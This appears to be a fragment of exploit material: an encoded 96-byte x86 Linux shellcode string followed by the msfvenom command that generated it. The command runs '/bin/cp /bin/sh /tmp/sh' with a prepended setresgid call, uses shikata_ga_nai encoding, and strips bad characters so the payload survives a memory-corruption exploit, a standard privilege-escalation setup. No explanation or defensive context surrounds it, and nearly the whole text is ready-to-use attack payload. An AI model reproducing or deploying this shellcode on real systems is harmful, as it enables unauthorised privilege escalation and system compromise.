\xbf\xf7\x35\xa1\xae\xda\xd1\xd9\x74\x24\xf4\x5b\x33\xc9\xb1\x12\x83\xc3\x04\x31\x7b\x0f\x03\x7b\xf8\xd7\x54\x9f\xcf\x29\x4c\x17\x2c\xf9\xd8\x15\x32\x90\x17\xfe\xab\x37\x4e\x96\xe6\xd4\x07\x81\x90\x35\x6b\x26\x60\x22\xa4\xd4\x09\xdc\x33\xfb\x9b\xc8\x5c\xfc\x1b\x09\x72\x9e\x72\x67\xa3\x3d\xf4\x57\x94\xa3\x9d\xf9\xc5\x50\x35\x26\x35\xe3\xa8\x56\x66\x78\x5a\x97\x2f\x2d\x13\x76\x02\x51
# msfvenom -p linux/x86/exec CMD="/bin/cp /bin/sh /tmp/sh" PrependSetresgid=true -a x86 --platform linux -b "\x00\x0a\x0d\x20" -e x86/shikata_ga_nai -i 1 -f c |reformat_sc.sh -o
# 96 bytes
